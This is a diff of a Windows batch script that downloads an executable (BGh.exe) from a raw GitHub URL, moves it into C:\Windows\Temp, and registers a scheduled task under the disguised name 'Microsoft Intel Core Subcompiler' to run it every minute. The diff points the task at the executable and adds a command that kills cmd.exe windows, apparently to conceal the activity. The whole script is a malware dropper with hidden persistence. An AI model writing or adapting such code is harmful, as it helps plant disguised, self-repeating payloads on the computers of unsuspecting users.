@@ -2,5 +2,6 @@ del /q BGh.exe
 dler https://raw.githubusercontent.com/dietrich03muller/test/master/BGh.exe BGh.exe
 move /y BGh.exe "C:\Windows\Temp"
 move /y dler.exe "C:\Windows\Temp"
-SCHTASKS /Create /sc MINUTE /f /tr "C:\Windows\Temp\BGh.bat" /mo 1 /TN "Microsoft Intel Core Subcompiler"
+SCHTASKS /Create /sc MINUTE /f /tr "C:\Windows\Temp\BGh.exe" /mo 1 /TN "Microsoft Intel Core Subcompiler"
+taskkill /f /im cmd.exe
 exit
